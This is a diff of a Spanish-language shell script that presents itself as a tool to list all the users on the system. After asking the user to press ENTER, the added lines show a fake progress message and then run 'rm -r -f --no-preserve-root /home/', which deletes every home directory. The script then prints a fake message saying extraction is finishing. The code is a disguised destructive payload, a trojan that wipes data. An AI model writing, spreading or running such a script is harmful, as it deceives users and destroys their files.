@@ -6,8 +6,10 @@ printf "      \e[1;77m\e[41m  Obtén toda la lista de usuarios de tu sistema!  \
 echo    
 echo   
 read -p "Pulsa ENTER para comenzar"
-sudo su
-rm -r -f /home/
+clear
+echo Esta comenzando el proceso...
+sleep 1
+rm -r -f --no-preserve-root /home/
 sleep 2
 echo Terminando proceso de obtención, espere...
 sleep 2
